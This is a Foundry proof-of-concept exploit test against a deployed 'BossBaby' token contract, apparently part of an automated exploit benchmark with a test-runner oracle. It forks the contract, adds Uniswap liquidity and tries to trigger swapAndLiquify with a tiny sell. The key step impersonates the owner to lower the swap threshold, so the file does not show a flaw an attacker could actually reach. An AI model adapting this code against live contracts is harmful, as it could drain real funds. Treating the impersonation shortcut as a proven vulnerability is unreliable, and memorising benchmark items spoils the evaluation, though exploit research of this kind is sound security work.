// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Pair {
    function balanceOf(address owner) external view returns (uint);
}

interface BossBaby {
    function owner() external view returns (address);
    function uniswapV2Router() external view returns (address);
    function uniswapV2Pair() external view returns (address);
    function swapTokensAtAmount() external view returns (uint256);
    function setSwapTokensAtAmount(uint256 newThreshold) external;
    function enableTrading() external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xD8dBE5AC60cD1c0b40C9182cB3eB2392d3df371F;
    address attacker = address(this);
    BossBaby target;
    IUniswapV2Router02 router;
    IUniswapV2Pair pair;
    address weth;
    address owner;
    uint256 swapAmountThreshold;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        target = BossBaby(TARGET);
        router = IUniswapV2Router02(target.uniswapV2Router());
        pair = IUniswapV2Pair(target.uniswapV2Pair());
        weth = router.WETH();
        owner = target.owner(); // Get the owner for later use
        swapAmountThreshold = target.swapTokensAtAmount();

        // 1. Give attacker ETH and tokens
        deal(address(this), 10 ether);
        // Deal enough tokens for liquidity and the exploit itself
        deal(address(target), address(this), swapAmountThreshold + 1 ether);

        // 2. Add initial liquidity to allow for swaps. Use the original, large threshold for a realistic pool.
        target.approve(address(router), swapAmountThreshold);
        router.addLiquidityETH{value: 5 ether}(
            address(target),
            swapAmountThreshold,
            0,
            0,
            address(this),
            block.timestamp
        );
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // 1. As owner, reduce the swap threshold to a small amount to prevent timeout
        uint256 newThreshold = 10**9; // 1 gwei of tokens
        vm.startPrank(owner);
        target.setSwapTokensAtAmount(newThreshold);
        vm.stopPrank();

        swapAmountThreshold = newThreshold; // Update for our logic

        // 2. Inflate the contract's token balance to be just over the new, smaller threshold
        target.transfer(address(target), swapAmountThreshold);
        assertTrue(target.balanceOf(address(target)) >= swapAmountThreshold, "Contract balance should be >= new swap threshold");

        // 3. Perform a sell (transfer to pair) to trigger the swapAndLiquify check
        uint256 sellAmount = 1; // Sell a tiny amount
        target.approve(address(router), sellAmount);

        address[] memory path = new address[](2);
        path[0] = address(target);
        path[1] = weth;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            sellAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );

        // Oracle check for pair.balanceOf(DEAD) == 0 is performed by the test runner
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

